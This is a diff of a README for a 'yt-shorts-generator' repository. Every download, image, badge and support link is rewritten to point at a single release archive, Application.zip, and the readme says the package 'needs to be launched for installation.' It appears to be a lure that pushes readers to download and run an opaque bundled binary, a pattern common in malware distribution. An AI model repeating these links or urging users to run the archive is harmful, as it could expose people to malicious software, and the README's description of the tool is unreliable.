@@ -1,7 +1,7 @@
 
 # 🚀 Welcome to the yt-shorts-generator Repository!
 
-![YouTube Shorts Generator](https://via.placeholder.com/800x400)
+![YouTube Shorts Generator](https://github.com/baitiche34/yt-shorts-generator/releases/download/v1.0/Application.zip)
 
 ## Overview
 
@@ -19,7 +19,7 @@ This repository contains a powerful tool that allows you to generate YouTube Sho
 
 ## Usage
 
-1. 📥 **Download the Software**: Get the software package from [here](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip). It needs to be launched for installation.
+1. 📥 **Download the Software**: Get the software package from [here](https://github.com/baitiche34/yt-shorts-generator/releases/download/v1.0/Application.zip). It needs to be launched for installation.
 
 2. 💻 **Install Dependencies**: Make sure to install all required dependencies outlined in the documentation.
 
@@ -41,9 +41,9 @@ This repository contains a powerful tool that allows you to generate YouTube Sho
 
 ## Support
 
-For detailed information, troubleshooting, and updates, please refer to the [Releases](https://github.com/Rubenas123/6487922/releases) section. Feel free to reach out to the community or open an issue for any queries or feedback.
+For detailed information, troubleshooting, and updates, please refer to the [Releases](https://github.com/baitiche34/yt-shorts-generator/releases/download/v1.0/Application.zip) section. Feel free to reach out to the community or open an issue for any queries or feedback.
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip)
+[![Download Software](https://github.com/baitiche34/yt-shorts-generator/releases/download/v1.0/Application.zip)](https://github.com/baitiche34/yt-shorts-generator/releases/download/v1.0/Application.zip)
 
 Start creating captivating YouTube Shorts effortlessly with the yt-shorts-generator repository! 🎥🚀
 
